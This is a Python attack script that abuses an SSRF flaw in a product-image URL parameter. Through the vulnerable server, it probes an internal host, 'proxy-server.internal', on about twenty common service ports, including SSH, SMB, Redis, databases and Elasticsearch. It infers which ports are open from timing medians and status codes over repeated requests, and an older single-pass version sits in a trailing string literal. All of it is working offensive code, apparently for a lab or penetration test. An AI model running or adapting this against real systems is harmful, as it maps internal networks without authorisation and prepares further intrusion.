import statistics
import time
import requests
from urllib.parse import quote

SSRF_ENDPOINT = "http://192.168.68.4/product/image?url={}"
TARGET_HOST = "proxy-server.internal"

PORTS = [
    21,  # FTP
    22,  # SSH
    25,  # SMTP
    53,  # DNS
    80,  # HTTP
    110,  # POP3
    143,  # IMAP
    443,  # HTTPS
    445,  # SMB
    3000,  # Dev-Web
    3306,  # MySQL
    5000,  # Dev-Web
    5432,  # PostgreSQL
    6379,  # Redis
    8000,  # HTTP-Web
    8080,  # HTTP-alt
    8081,  # HTTP-alt
    8888,
    9000,
    9200,  # Elasticsearch
    11211,  # Memcached,
    27017,  # mongoDB
]

RETRIES = 5


def blind_ssrf_port(port):
    times = []
    statuses = []

    for _ in range(RETRIES):
        internal_url = f"http://{TARGET_HOST}:{port}/"
        url = SSRF_ENDPOINT.format(quote(internal_url, safe=""))

        start = time.perf_counter()

        try:
            r = requests.get(
                url,
                timeout=5,
                allow_redirects=False,
            )

            elapsed = time.perf_counter() - start

            times.append(elapsed)
            statuses.append(str(r.status_code))

        except requests.exceptions.Timeout:
            times.append(5.0)
            statuses.append("TIMEOUT")

        except requests.exceptions.RequestException:
            elapsed = time.perf_counter() - start
            times.append(elapsed)
            statuses.append("ERROR")

    return statistics.median(times), statuses


for port in PORTS:
    median_time, statuses = blind_ssrf_port(port)

    print(
        f"{TARGET_HOST}:{port:<5} "
        f"median={median_time:.3f}s "
        f"result={','.join(statuses)}"
    )

"""
for port in PORTS:
    internal_url = f"http://{TARGET_HOST}:{port}/"
    url = SSRF_ENDPOINT.format(quote(internal_url, safe=""))

    start = time.perf_counter()

    try:
        r = requests.get(
                url,
                timeout=5,
                allow_redirects=False,
                )

        elasped = time.perf_counter() - start

        print(
                f"{TARGET_HOST}:{port:<5} "
                f"status={r.status_code:<3} "
                f"time={elasped:.3f}s "
                f"length={len(r.content)}"
                )

    except requests.exceptions.Timeout:
        elasped = time.perf_counter() - start
        print(
                f"{TARGET_HOST}:{port:<5} "
                f"TIMEOUT "
                f"time={elasped:.3f}s"
                )

    except requests.exceptions.RequestException as e:
        elasped = time.perf_counter() - start
        print(
                f"{TARGET_HOST}:{port:<5} "
                f"ERROR "
                f"time={elasped:.3f}s "
                f"{type(e).__name__}"
                )

"""
